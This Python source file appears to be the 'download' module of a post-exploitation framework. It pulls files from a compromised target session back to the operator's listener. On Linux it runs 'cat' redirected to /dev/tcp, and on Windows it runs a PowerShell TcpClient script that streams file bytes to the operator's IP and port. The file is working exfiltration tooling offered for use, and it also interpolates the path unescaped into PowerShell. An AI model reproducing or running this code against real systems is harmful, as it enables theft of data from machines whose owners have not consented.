from __future__ import annotations
import ntpath
import os
import posixpath
import shlex
from koi.modules.blueprint import KoiModule, TCPReceiveServer
from koi.utils.config import TIMEOUTS


def _remote_basename(path: str) -> str:
    """Return the filename portion of a remote path (Linux or Windows)."""
    return ntpath.basename(path) or posixpath.basename(path)


def _shell_quote(path: str) -> str:
    """Quote a path for safe use in a remote shell command (Linux only)."""
    return shlex.quote(path)


class DownloadModule(KoiModule):
    name = "download"
    description = "Download a file from the target via a dedicated TCP connection."
    usage = "download <id> <remote_path> [-o <local_path>]"
    category = "File transfer"
    platform = ["linux", "windows_ps"]
    arguments = [
        {
            "flags": ["remote_path"],
            "help": "Path of the file on the remote target (quotes optional, spaces supported)",
            "nargs": "+",
        },
        {"flags": ["-o", "--output"], "default": None, "help": "Local output path"},
    ]

    def run(self) -> None:
        remote_path = " ".join(self.args.remote_path)
        local_path  = self.args.output or _remote_basename(remote_path)
        local_ip    = self._get_local_ip()
        os_type     = self.session.os_type

        quoted = _shell_quote(remote_path)

        with self.spinner("Checking file and getting size..."):
            if os_type == "linux":
                size_str = self._exec_clean(f"[ -f {quoted} ] && wc -c < {quoted} || echo 'not_found'")
                if size_str == "not_found":
                    self.err(f"Remote file not found: {remote_path}")
                    return
                try:
                    remote_size = int(size_str.split()[0])
                except (ValueError, IndexError):
                    remote_size = None
            else:
                info_raw = self._win_query(f"if(Test-Path '{remote_path}'){{(Get-Item '{remote_path}').Length}}else{{'not_found'}}")
                if info_raw == "not_found":
                    self.err(f"Remote file not found: {remote_path}")
                    return
                try:
                    remote_size = int(info_raw.strip())
                except (ValueError, IndexError):
                    remote_size = None

        bar = self.ui.ProgressBar(total=remote_size or 0)
        srv  = TCPReceiveServer(timeout=TIMEOUTS["download"], on_progress=bar.update).start()
        port = srv.port

        self.status(
            f"Downloading {remote_path}"
            + (f" ({remote_size} bytes)" if remote_size else "")
            + "..."
        )

        if os_type == "linux":
            self.exec(
                f"cat {quoted} > /dev/tcp/{local_ip}/{port}",
                timeout=TIMEOUTS["download"],
            )
        else:
            ps_cmd = (
                f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
                f"$_s=$_c.GetStream();"
                f"$_f=[IO.File]::OpenRead((Get-Item '{remote_path}').FullName);"
                f"$_b=New-Object byte[] 65536;"
                f"while(($_n=$_f.Read($_b,0,$_b.Length))-gt 0){{$_s.Write($_b,0,$_n)}};"
                f"$_f.Close();$_s.Flush();$_c.Close()"
            )

            self._dispatch_ps(ps_cmd)

        try:
            raw = srv.collect()
        except (RuntimeError, TimeoutError) as exc:
            self.err(f"Transfer failed: {exc}")
            return
        bar.done()
        print()
        try:
            with open(local_path, "wb") as f:
                f.write(raw)
        except OSError as exc:
            self.err(f"Could not write {local_path}: {exc}")
            return

        self.box("Download complete", {
            "remote path": remote_path,
            "local path":  os.path.abspath(local_path),
            "size":        f"{len(raw)} bytes  ({len(raw)/1024:.1f} KB)",
        })